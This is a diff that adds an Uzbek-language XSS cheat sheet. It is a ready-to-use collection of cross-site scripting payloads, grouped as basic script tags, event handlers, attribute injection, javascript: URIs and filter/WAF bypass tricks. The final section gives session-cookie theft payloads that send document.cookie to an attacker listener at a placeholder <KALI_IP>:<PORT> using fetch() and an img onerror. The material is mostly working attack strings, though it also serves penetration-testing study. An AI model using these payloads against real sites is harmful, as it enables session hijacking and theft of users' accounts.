@@ -1,0 +1,127 @@
+XSS (Cross-Site Scripting) zaifliklarini test qilish va filtrlarni aylanib oʻtish (WAF Bypass) uchun ishlatiladigan, turlari boʻyicha guruhlangan mukammal **XSS Cheat Sheet**:
+
+---
+
+## 1. Klassik va Standart XSS (Basic Payloads)
+
+Hech qanday xavfsizlik filtrlari oʻrnatilmagan, oddiy kiritish maydonlarida ishlaydigan standart skriptlar:
+
+```html
+<script>alert(1)</script>
+<script>alert(document.cookie)</script>
+<script>confirm("XSS")</script>
+<script>prompt(1)</script>
+
+```
+
+---
+
+## 2. HTML Teglarining Hodisalari (Event Handlers)
+
+Agarda veb-ilova standart `<script>` tegini bloklasa, HTML elementlarining turli holat yuz berganda ishga tushadigan ichki hodisalaridan foydalaniladi:
+
+| Element turi | Payload (Kodi) | Ishlash mantiqi |
+| --- | --- | --- |
+| **Rasm (Image)** | `<img src=x onerror=alert(1)>` | Rasm topilmaganda `onerror` ishga tushadi. |
+| **Rasm (Muqobil)** | `<img src="javascript:alert(1)">` | Standart rasm yuklash yoʻli orqali. |
+| **Sarlavha (Svg)** | `<svg onload=alert(1)>` | Sahifa yoki SVG elementi yuklanishi bilan ishlaydi. |
+| **Tana (Body)** | `<body onload=alert(1)>` | Butun sahifa yuklanganda avtomatik ishga tushadi. |
+| **Kiritish (Input)** | `<input type="text" autofocus onfocus=alert(1)>` | Maydon avtomatik fokuslanganda ishlaydi. |
+| **Video/Audio** | `<video><source onerror="alert(1)"></video>` | Video fayl xato yuklanganda ishlaydi. |
+| **Iframe** | `<iframe src="javascript:alert(1)"></iframe>` | Alohida freym ichida kodni ijro etadi. |
+
+---
+
+## 3. Atributlarni Yopish orqali XSS (Attribute Injection)
+
+Agar siz kiritgan matn sahifadagi biror HTML elementi atributining (masalan, `value="..."` yoki `href="..."`) ichiga tushayotgan boʻlsa, avval oʻsha atribut va teg yopiladi, soʻngra yangi kod yoziladi:
+
+* **Tegni yopib, yangi teg ochish:**
+```text
+"> <script>alert(1)</script>
+
+```
+
+
+* **Mavjud atribut ichida hodisa yaratish:**
+```text
+" onmouseover="alert(1)
+
+```
+
+
+*(Sichqoncha oʻsha element ustiga olib borilganda ishlaydi).*
+
+---
+
+## 4. Javascript Markdown va URL ichida (URI Schemes)
+
+Agar veb-sayt faqat havola (link) qabul qilsa (masalan, foydalanuvchi sayti yoki profil havolasi), URL oʻrniga JavaScript sxemasini yuborish mumkin:
+
+```text
+javascript:alert(1)
+javaScript:alert(1)
+javascript:confirm(document.domain)
+
+```
+
+*(Foydalanuvchi oʻsha linkni bosgan zahoti kodi ishga tushadi).*
+
+---
+
+## 5. Filtrlarni Aylanib Oʻtish (WAF & Filter Bypass)
+
+Dasturchilar koʻpincha ma'lum soʻzlarni (masalan, `alert` yoki `script`) filtrlaydi. Ularni quyidagicha aldash mumkin:
+
+### Katta-kichik harflarni aralashtirish (Case Mutation)
+
+```html
+<sCrIpt>alert(1)</ScRiPt>
+<ImG SrC=X OnErRoR=alert(1)>
+
+```
+
+### `alert` soʻzi bloklanganda muqobillaridan foydalanish
+
+```html
+<script>confirm(1)</script>
+<script>prompt(1)</script>
+<script>print()</script>
+
+```
+
+### JavaScript funksiyasini satrlar orqali chaqirish (String Evaluation)
+
+`alert` soʻzini toʻgʻridan-toʻgʻri yozmasdan, uni matn koʻrinishida birlashtirib ishga tushirish:
+
+```html
+<script>setTimeout("ale"+"rt(1)", 0)</script>
+<script>window['al'+'ert'](1)</script>
+
+```
+
+### Koʻp uchraydigan qavslar `()` bloklanganda
+
+```html
+<script>alert`1`</script>
+<svg onload="alert`XSS`"></svg>
+
+```
+
+---
+
+## 6. Maxfiy Ma'lumotlarni O'g'irlash (Exploitation)
+
+XSS zaifligini aniqlagandan so'ng, foydalanuvchining pechenyalarini (Session Cookies) kiberhujumchining tinglovchi serveriga (masalan, Netcat portiga) jo'natish uchun payloadlar:
+
+```html
+<script>fetch('http://<KALI_IP>:<PORT>/?cookie=' + document.cookie)</script>
+
+```
+
+yoki qisqaroq variant rasm orqali (bu ko'p holatlarda filtrdan oson o'tadi):
+
+```html
+<img src="x" onerror="this.src='http://<KALI_IP>:<PORT>/?cookie=' + document.cookie">
+
+```
